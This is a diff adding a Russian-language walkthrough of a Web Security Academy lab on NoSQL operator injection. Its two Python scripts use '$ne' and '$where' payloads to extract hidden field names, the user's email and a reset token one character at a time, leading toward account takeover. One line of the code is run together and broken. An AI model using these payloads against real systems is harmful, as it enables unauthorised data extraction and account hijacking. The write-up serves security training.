@@ -372,3 +372,117 @@ admin' && this.foo!='
 Это исследует первое поле данных в объекте пользователя и возвращает первый символ имени поля. Данной обстоятельство позволяет извлекать имя и поля по символам
 
 # Пример Lab: Exploiting NoSQL operator injection to extract unknown fields
+Для решения необходимо найти уязвимость, я воспользовался методом с выражением где заместо `password` мы используем `$ne` и в результате получил что аккаунт заблокирован и чтобы получить к нему доступ необходимо ввести пароль, но для пароля нужна почта, для этого я написал следующий скрипт чтобы найти скрытые поля, потому что `$where` условие работает 
+
+```python
+import string  
+import requests  
+  
+target = "https://0ab30071037eb417802f304700370073.web-security-academy.net"  
+url = f"{target}/login"  
+cookie = {"session": "WvETbgSL23IQU7lOgTZnVNctVDcOQ1Cx"}  
+  
+Lines = 10  
+Alphabet = string.ascii_letters + string.digits + string.punctuation   
+  
+def regexjs(ch: str) -> str:  
+    regex_meta = r"\.^$*+?()[]{}|"  
+    if ch in regex_meta:  
+        return "\\\\" + ch  
+    if ch == "'":  
+        return "\\'"  
+    return ch  
+  
+def bruteForceFields():  
+    for i in range(Lines):  
+        print(f"[*]Ищем поле {i}")  
+        findline = True  
+        result = ""  
+  
+        while True:  
+            position = len(result)  
+            found_char = False  
+  
+            for char in Alphabet:  
+                expChar = regexjs(char)  
+  
+                payload = {  
+                    "username": "carlos",  
+                    "password": {"$ne": ""},  
+                    "$where": f"Object.keys(this)[{i}].match('^.{{{position}}}{expChar}.*')"  
+                }  
+  
+                try:  
+                    response = requests.post(  
+                        url,  
+                        cookies=cookie,  
+                        json=payload,  
+                        timeout=10  
+                    )  
+  
+                    if "Account locked: please reset your password" in response.text:  
+                        result += char  
+                        print(f"[*]Текущее значение {i} поля: {result}")  
+                        found_char = True  
+                        break  
+                except Exception as e:  
+                    print(f"[!] Error: {e}")  
+                    return  
+  
+            if not found_char:  
+                if result:  
+                    print(f"[+] Поле {i} найдено: {result}")  
+                else:  
+                    print(f"[-] Поле {i} не найдено")  
+                    findline = False  
+                break        
+                
+        if not findline:  
+            break  
+  
+if __name__ == "__main__":  
+    bruteForceFields()
+```
+
+Таким образом мы получим список всех доступных полей, далее нужно использовать функцию сброса пароля, чтобы посмотреть изменится ли что то, но для нее необходимо знать email для этого чуть меняем функцию и используем следующий кусок для того чтобы вытащить параметр email отдельно 
+
+```Python
+def bruteForceFieldValue(fieldName):  
+    print(f"[*] Извлекаем значение поля: {fieldName}")  
+    result = ""  
+  
+    while True:  
+        found_char = False  
+        position = len(result)  
+  
+        for char in Alphabet:  
+            expChar = regexjs(char)  
+  
+            payload = {  
+                "username": "carlos",  
+                "password": {"$ne": "invalid"},  
+                "$where": f"this.{fieldName}.toString().match('^.{{{position}}}{expChar}.*')"  
+            }  
+  
+            try:  
+                response = requests.post(url, cookies=cookie, json=payload, timeout=10)  
+  
+                if "Account locked: please reset your password" in response.text:  
+                    result += char  
+                    print(f"[+] Найдено: {result}")  
+                    found_char = True  
+                    break            except Exception as e:  
+                print(f"[!] Ошибка: {e}")  
+                return  
+  
+        if not found_char:  
+            print(f"\n[!!!] Итоговое значение {fieldName}: {result}\n")  
+            break  
+    return result  
+  
+if __name__ == "__main__":  
+    bruteForceFieldValue("email")
+```
+
+После чего получаем наш валидный email пользователя и используем его для сброса пароля, далее используем опять функцию перебора значений для нахождения скрытых полей если они появились и действительно у нас появится скрытое значение токена, которое мы можем вытащить и использовать для смены пароля, используем все ту же функцию а потом, используем код для восстановления пароля нашего carlos
+
